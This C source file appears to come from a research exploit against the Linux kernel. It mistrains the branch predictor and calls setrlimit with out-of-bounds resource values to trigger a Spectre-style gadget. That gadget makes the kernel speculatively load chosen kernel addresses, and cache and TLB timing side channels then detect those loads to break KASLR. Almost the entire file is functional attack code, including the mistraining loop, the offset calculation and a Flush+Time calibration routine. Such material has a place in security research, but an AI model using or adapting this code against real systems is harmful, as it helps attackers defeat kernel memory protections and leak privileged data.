#include "prlimit.h"
#include "kaslr_break.h"
#include "util.h"
#include <limits.h>
#include <sys/resource.h>


/*
 * @param resource: The resource to be set.
 * @param rlim: The rlimit structure to be set.
 * @description: The function calls the `setrlimit` syscall which contains the half-Spectre gadget.
 * Before calling `setrlimit`, it clears the Pattern History Table (PHT) in order to ensure 
 * mistraining of the branch and hence, conditional branch speculation.
 */
__attribute__((noinline)) static void do_prlimit(unsigned int resource, struct rlimit *rlim)
{
    asm volatile (
        ".rept 200\n"
            "jmp 1f\n"
            "1:\n"
        ".endr\n"
    );
    setrlimit(resource, rlim);
}

/*
 * @param offset: The offset to be passed to the half-Spectre gadget.
 * @description: The function triggers the gadget by calling `setrlimit` with a malicious offset.
 * It first mistrains the branch by calling `setrlimit` with a valid resource and then calls it
 * with the malicious offset.
 */

static void trigger_do_prlimit(unsigned int offset)
{
    struct rlimit rlim;
    rlim.rlim_max = 0xffffffffffffffff;
    rlim.rlim_cur = 1;

    // Mistrain the branch.
    for(int i = 0; i < BPU_TRAINING_ROUNDS; ++i)
        do_prlimit(RLIMIT_MSGQUEUE, &rlim);

    // Speculatively execute gadget with malicious offset.
    do_prlimit(offset, &rlim);
}

/* 
 * @param byte_offset: The offset to be used for the speculative load.
 * @param n: The number of times to trigger the gadget.
 * @description: Let the kernel speculatively load the cacheline at byte offset `offset` from
 * the gadget's base, `n` times.
 * @prerequisites:
 * - `RLIM_NLIMITS * sizeof(struct rlimit) < byte_offset < UINT_MAX * sizeof(struct rlimit)`
 * and at least one of the following must hold:
 * - either gadget_base has been initialized;
 * - or `byte_offset` is a multiple of sizeof(struct rlimit).
 */
void speculatively_load_relative(uint64_t byte_offset, int n)
{
    uint64_t gadget_offset;

    // If we cut off the extra bits `byte_offset`, do we cross to the previous
    // cacheline?
    if ((gadget_base() & 0x3f) + (byte_offset % sizeof(struct rlimit)) + sizeof(struct rlimit)-1 >= 0x40)
        // Yes: hence round up the offset.
        gadget_offset = (byte_offset + sizeof(struct rlimit)-1) / sizeof(struct rlimit);
    else
        // No: hence round down the offset.
        gadget_offset = byte_offset / sizeof(struct rlimit);

#ifdef SANITY
    if (!(RLIM_NLIMITS < gadget_offset && gadget_offset < UINT_MAX))
        dump_hex(gadget_offset);
    assert(RLIM_NLIMITS < gadget_offset && gadget_offset < UINT_MAX);
#endif

    for (int i = 0; i < n; i++) {
        trigger_do_prlimit((unsigned int)gadget_offset);
    }
}

/* 
 * @param kaddr: The kernel address to be (speculatively) loaded.
 * @description: Let the kernel speculatively load the cacheline at kernel address `kaddr`.
 * We trigger the gadget 10 times to boost confidence.
 */
void speculatively_load(kva_t kaddr)
{
    speculatively_load_relative(kaddr - gadget_base(), 10);
}

/* 
 * Following two `clone` functions are used to do the speculative loads in the gadget_base module.
 * When repeating the speculative load we must `usleep` between gadget triggers as that seems to 
 * provide us with a much better signal with the prefetch side channel to leak the super pages in 
 * the TLB. This probably induces some more contention allowing the speculative window to be 
 * enlarged. However, it has nothing to do with the results from this paper (https://arxiv.org/pdf/
 * 2008.02307) as usleep(0) does not result in a syscall and the Spectre-v2 collisions are no 
 * longer exploitable on modern systems.
 * On the other hand, for the cache signal this doesn't seem to hold as well therefore we just use 
 * two different functions.
 */

void speculatively_load_relative_tlb(uint64_t byte_offset, int n)
{
    uint64_t gadget_offset;

    // If we cut off the extra bits `byte_offset`, do we cross to the previous
    // cacheline?
    if ((gadget_base() & 0x3f) + (byte_offset % sizeof(struct rlimit)) + sizeof(struct rlimit)-1 >= 0x40)
        // Yes: hence round up the offset.
        gadget_offset = (byte_offset + sizeof(struct rlimit)-1) / sizeof(struct rlimit);
    else
        // No: hence round down the offset.
        gadget_offset = byte_offset / sizeof(struct rlimit);

#ifdef SANITY
    if (!(RLIM_NLIMITS < gadget_offset && gadget_offset < UINT_MAX))
        dump_hex(gadget_offset);
    assert(RLIM_NLIMITS < gadget_offset && gadget_offset < UINT_MAX);
#endif

    for (int i = 0; i < n; i++) {
        trigger_do_prlimit((unsigned int)gadget_offset);
        usleep(0);
    }
}

/* Let the kernel speculatively load the cacheline at kernel address `kaddr`.
 *
 * It is one, or two consecutive, 8 byte load(s) -- depending on window depth.
 * We do it 5 times to boost confidence.
 */
void speculatively_load_tlb(kva_t kaddr)
{
    speculatively_load_relative_tlb(kaddr - gadget_base(), 5);
}

/* 
 * @description: The function makes sure that the gadget can be triggered and that SMT contention 
 * works as expected to trigger the speculative load by mapping a user space page (i.e., a reload 
 * buffer), measures the access latency after having flushed the address from the cache (expect 
 * high latency), after loading the address (expect low latency) and after speculatively loading 
 * the address (expect low latency).
 */
void do_prlimit_init(void)
{
    constexpr int N_ROUNDS = 10000;
    void *uaddr;
    kva_t kaddr = 0;

    // Allocate a user page and calculate with what offset we can hit our data via the gadget.
    uint64_t count = 0;
    while (kaddr <= gadget_base()) {
        uaddr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0); assert(uaddr != MAP_FAILED);
        kaddr = direct_map() + procfs_get_physaddr((uint8_t *)uaddr);
    }

    count = 0;
    for (int i = 0; i < N_ROUNDS; i++) {
        clflush(uaddr); cpuid();
        count += time_access(uaddr) < CACHE_THRES; cpuid();
    }
    pr_info("Flush+Time:         %lu\n", count);

    count = 0;
    for (int i = 0; i < N_ROUNDS; i++) {
        clflush(uaddr); cpuid();
        load(uaddr); cpuid();
        count += time_access(uaddr) < CACHE_THRES; cpuid();
    }
    pr_info("Flush+Load+Time:    %lu\n", count);

    count = 0;
    step_start();
    for (int i = 0; i < N_ROUNDS; i++) {
        clflush(uaddr); cpuid();
        speculatively_load(kaddr); cpuid();
        count += time_access(uaddr) < CACHE_THRES; cpuid();
    }
    step_end();
    pr_info("Flush+Spectre+Time: %lu %s\n", count , count  > 0 ? " <----- SMT CONTENTION WORKING!" : "");
}
